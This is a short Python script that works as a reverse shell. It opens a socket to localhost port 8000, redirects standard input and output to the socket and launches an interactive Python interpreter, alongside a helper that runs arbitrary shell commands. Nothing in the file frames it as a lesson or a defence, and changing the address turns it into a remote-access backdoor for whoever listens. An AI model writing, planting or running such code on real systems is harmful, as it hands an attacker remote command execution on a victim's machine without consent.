import code, sys, socket
from subprocess import PIPE, Popen

class Pyterpreter(socket.socket):
    def __init__(self, *args):
        socket.socket.__init__(self, *args)
    def write(self, text):
        socket.socket.send(self, text.encode())
    def readline(self):
        return self.recv(4096).decode()


def run(cmd):
    process = Popen(cmd, shell=True, stdin=PIPE, stderr=PIPE, stdout=PIPE)
    result, error = process.communicate()
    return (result + error).decode()


pyterpreter = Pyterpreter()
pyterpreter.connect(("localhost", 8000))
sys.stdin = sys.stdout = sys.stderr = pyterpreter
code.interact("banner", local=locals())